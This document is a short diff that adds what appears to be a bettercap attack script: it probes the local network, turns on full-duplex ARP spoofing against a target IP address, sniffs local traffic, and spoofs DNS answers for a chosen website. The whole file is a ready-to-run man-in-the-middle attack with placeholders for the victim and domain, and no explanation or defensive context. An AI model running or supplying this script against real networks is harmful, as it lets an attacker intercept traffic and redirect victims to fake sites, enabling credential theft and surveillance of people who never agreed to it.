@@ -1,0 +1,9 @@
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets <ipaddress>
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+set dns.spoof.all true
+set dns.spoof.domains <website name>
+dns.spoof on
